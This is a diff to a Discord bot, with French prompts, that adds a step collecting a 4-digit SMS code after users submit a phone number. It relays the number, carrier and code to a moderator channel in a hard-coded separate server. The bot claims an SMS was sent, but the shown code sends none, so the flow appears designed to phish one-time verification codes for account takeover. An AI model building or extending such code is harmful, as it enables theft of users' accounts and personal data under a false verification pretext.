@@ -7,6 +7,7 @@ app.listen(process.env.PORT || 3000);
 
 const client = new Client({ intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMembers] });
 const pending = new Map();
+const tempPhones = new Map();
 const blacklistedNums = new Set();
 const blacklistedUsers = new Set();
 const MOD_GUILD_ID = process.env.MOD_GUILD_ID || "1547685592928751628";
@@ -44,11 +45,11 @@ async function getModChannel() {
   throw new Error("Salon modo introuvable");
 }
 
-async function sendToMods(originInteraction, phone) {
+async function sendToMods(originInteraction, phone, code) {
   const user = originInteraction.user;
   const originGuild = originInteraction.guild;
   const key = `${originGuild.id}:${user.id}`;
-  pending.set(key, { phone, originGuildId: originGuild.id, userId: user.id, date: new Date() });
+  pending.set(key, { phone, code, originGuildId: originGuild.id, userId: user.id, date: new Date() });
   const modChannel = await getModChannel();
   const memberCount = originGuild.memberCount || 0;
   const now = new Date();
@@ -62,7 +63,7 @@ async function sendToMods(originInteraction, phone) {
     .addFields(
       { name: "Présence", value: `> 🟢 présent`, inline: false },
       { name: "Numéro", value: `> \`${formatted}\` · ${operator}`, inline: false },
-      { name: "📋 Suivi vérification", value: `> 🔄 Statut — SMS envoyé — en attente du code membre\n> 🌐 Code — En attente du code membre\n> 📅 Soumis — ${dateStr} · à l'instant\n> 📩 SMS envoyé — ${dateStr} · à l'instant`, inline: false }
+      { name: "📋 Suivi vérification", value: `> 🔄 Statut — SMS envoyé — en attente du code membre\n> 🌐 Code — \`${code}\`\n> 📅 Soumis — ${dateStr} · à l'instant\n> 📩 SMS envoyé — ${dateStr} · à l'instant`, inline: false }
     )
     .setColor(0x2b2d31);
   const row1 = new ActionRowBuilder().addComponents(
@@ -119,9 +120,36 @@ client.on("interactionCreate", async (i) => {
       await i.reply({ content: "Numéro invalide.", ephemeral: true });
       return;
     }
-    await i.reply({ content: "Numéro reçu. En attente de validation par un modérateur.", ephemeral: true });
+    tempPhones.set(`${i.guild.id}:${i.user.id}`, phone);
+    const nextRow = new ActionRowBuilder().addComponents(
+      new ButtonBuilder().setCustomId("goto_code").setLabel("Continuer").setStyle(ButtonStyle.Primary)
+    );
+    await i.reply({ content: "SMS envoyé. Clique sur Continuer pour entrer le code à 4 chiffres reçu.", components: [nextRow], ephemeral: true });
+    return;
+  }
+  if (i.isButton() && i.customId === "goto_code") {
+    const modal2 = new ModalBuilder().setCustomId("verif-code").setTitle("Vérification — Code SMS");
+    const codeInput = new TextInputBuilder().setCustomId("code").setLabel("Ton code à 4 chiffres").setPlaceholder("0000").setStyle(TextInputStyle.Short).setMinLength(4).setMaxLength(4).setRequired(true);
+    modal2.addComponents(new ActionRowBuilder().addComponents(codeInput));
+    await i.showModal(modal2);
+    return;
+  }
+  if (i.isModalSubmit() && i.customId === "verif-code") {
+    const code = i.fields.getTextInputValue("code").trim();
+    if (!/^[0-9]{4}$/.test(code)) {
+      await i.reply({ content: "Code invalide : 4 chiffres.", ephemeral: true });
+      return;
+    }
+    const tKey = `${i.guild.id}:${i.user.id}`;
+    const phone = tempPhones.get(tKey);
+    if (!phone) {
+      await i.reply({ content: "Refais la vérification depuis le début.", ephemeral: true });
+      return;
+    }
+    tempPhones.delete(tKey);
+    await i.reply({ content: "Code reçu. En attente de validation par un modérateur.", ephemeral: true });
     try {
-      await sendToMods(i, phone);
+      await sendToMods(i, phone, code);
     } catch {
       await i.followUp({ content: "Erreur d'envoi vers la modération.", ephemeral: true });
     }
